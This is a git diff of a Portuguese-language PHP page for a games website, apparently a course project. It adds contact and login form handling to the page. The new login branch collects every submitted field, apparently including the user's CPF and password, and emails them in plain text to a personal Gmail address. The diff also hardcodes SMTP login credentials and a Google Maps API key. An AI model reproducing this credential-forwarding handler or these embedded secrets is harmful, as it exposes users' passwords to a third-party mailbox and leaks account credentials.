@@ -29,30 +29,53 @@
 </head>
 <body>
   <?php
-    if(isset($_POST['acao']))
-//Enviei o Formulario
-    if($_POST['email'] != ''){
+    if(isset($_POST['acao']) && $_POST['identificador'] == 'form_contato'){
+    //Enviei o Formulario
+      if($_POST['email'] != ''){
         $email = $_POST['email'];
-        if(filter_var($email, FILTER_VALIDATE_EMAIl)){
-//tudo certo, é um email, só enviar
-            $mail = new Email('vps.dankicode.com','testes@dankicode.com','gui123456','Guilherme');
-            $mail->addAdress('allysomted12@gmail.com', 'Lyo');
-            $corpo = "Sua duvida foi enviada:<hr>$email";
-            $info = array('assunto'=>'Sua dúvida', 'corpo'=>$email);
-//$info = ['assunto'=>'Sua dúvida', 'corpo'=>$email];
-            $mail->formatarEmail($info);
-            if($email->enviarEmail()){
-                echo '<script>alert("enviado com sucesso!")</script>';
-            }else{
-                echo '<script>alert("algo deu errado")</script>';
-            }
-        }else{
-            echo '<script>alert("Não é um email válido!")</script>';
+      if(filter_var($email, FILTER_VALIDATE_EMAIL)){
+      //tudo certo, é um email, só enviar
+        $mail = new Email('vps.dankicode.com','testes@dankicode.com','gui123456','Guilherme');
+        $mail->addAdress('allysomted12@gmail.com', 'Lyo');
+
+        $corpo = "Sua duvida foi enviada:<hr>$email";
+        $info = array('assunto'=>'Sua dúvida', 'corpo'=>$corpo);
+        //$info = ['assunto'=>'Sua dúvida', 'corpo'=>$email];
+        $mail->formatarEmail($info);
+        if($mail->enviarEmail()){
+          echo '<script>alert("enviado com sucesso!")</script>';
+      }else{
+          echo '<script>alert("algo deu errado")</script>';
+      }
+       }else{
+           echo '<script>alert("Não é um email válido!")</script>';
+  }
+}else{
+  echo '<script>alert("Campos vázios não são permitidos!")</script>';
         }
-    }else{
-        echo 'Insira um email válido.';
+    }else if(isset($_POST['acao']) && $_POST['identificador'] == 'form_login'){
+      /*
+        $cpf = $_POST['cpf'];
+        $senha = $_POST['senha'];
+        */
+        $assunto ='Teve um acesso com a sua conta!';
+        $corpo = '';
+        foreach ($_POST as $key => $value){
+          $corpo.=ucfirst($key).": ".$value;
+          $corpo.="<hr>";
+        }
+
+        $info = array('assunto'=>$assunto,'corpo'=>$corpo);
+        $mail = new Email('vps.dankicode.com','testes@dankicode.com','gui123456','Guilherme');
+        $mail->addAdress('allysomted12@gmail.com', 'Lyo');
+        $mail->formatarEmail($info);
+        if($mail->enviarEmail()){
+           echo '<script>alert("enviado com sucesso!")</script>';
+         }else{
+           echo '<script>alert("algo deu errado")</script>';
+      }
     }
-    
+
 ?>
   <base base="<?php echo INCLUDE_PATH; ?>" />
   <?php
@@ -64,17 +87,18 @@
       }
 
   ?>
-<?php //new Email(); ?>
+<?php //new Email();
+ ?>
 <header>   
         <a href="<?php echo INCLUDE_PATH; ?>home" class="logo"><img src="imagens/logo.png" width="100px"></a><!--ficara a logo-->
         <nav class="desktop">
             <ul>
                 <li><a href="<?php echo INCLUDE_PATH; ?>home">HOME</a></li>
                 <li><a realtime="jogos" href="<?php echo INCLUDE_PATH; ?>jogos">JOGOS</a></li>
-                <li><a realtime="minha_carteira" href="<?php echo INCLUDE_PATH; ?>minha_carteira">MINHA CARTEIRA</a></li>
                 <li><a href="<?php echo INCLUDE_PATH; ?>sobre">SOBRE</a></li>
                 <li><a realtime="contato" href=" <?php echo INCLUDE_PATH; ?>contato">CONTATOS</a></li>
                 <li><a realtime="login"href="<?php echo INCLUDE_PATH; ?>login">LOGIN</a></li>
+                <li><a realtime="registro" href="<?php echo INCLUDE_PATH; ?>registro">REGISTRO</a></li>
             </ul>
         </nav>
         <nav class="search">
@@ -90,11 +114,10 @@
             <ul>
                 <li><a href="<?php echo INCLUDE_PATH; ?>home">HOME</a></li>
                 <li><a realtime="jogos" href="<?php echo INCLUDE_PATH; ?>jogos">JOGOS</a></li>
-                
-                <li><a realtime="minha_carteira" href="<?php echo INCLUDE_PATH; ?>minha_carteira">MINHA CARTEIRA</a></li>
                 <li><a href="<?php echo INCLUDE_PATH; ?>sobre">SOBRE</a></li>
                 <li><a realtime="contato" href="<?php echo INCLUDE_PATH; ?>contato">CONTATOS</a></li>
                 <li><a realtime="login"href="<?php echo INCLUDE_PATH; ?>login">LOGIN</a></li>
+                <li><a realtime="registro" href="<?php echo INCLUDE_PATH; ?>registro">REGISTRO</a></li>
             </ul>
             </ul>
         </nav>    
@@ -166,8 +189,8 @@
 
 <script src="<?php echo INCLUDE_PATH; ?>js/jquery.js"></script> 
 <script src="<?php echo INCLUDE_PATH; ?>js/map.js"></script>
+<script type="text" src="<?php echo INCLUDE_PATH; ?>js/main.js"></script>
 <script src='https://maps.googleapis.com/maps/api/js?v=3.exp&key=AIzaSyDHPNQxozOzQSZ-djvWGOBUsHkBUoT_qH4'></script>
-<script src="<?php echo INCLUDE_PATH; ?>js/main.js"></script>
 <script src="<?php echo INCLUDE_PATH; ?>js/constants.js"></script>
 <script src="<?php echo INCLUDE_PATH; ?>js/scripts.js"></script>
 <?php
@@ -179,5 +202,6 @@
       if($url == 'contato'){   
 ?>
 <?php    }  ?>
+<script src="<?php echo INCLUDE_PATH; ?>js/formularios.js"></script>
 </body> 
 </html>
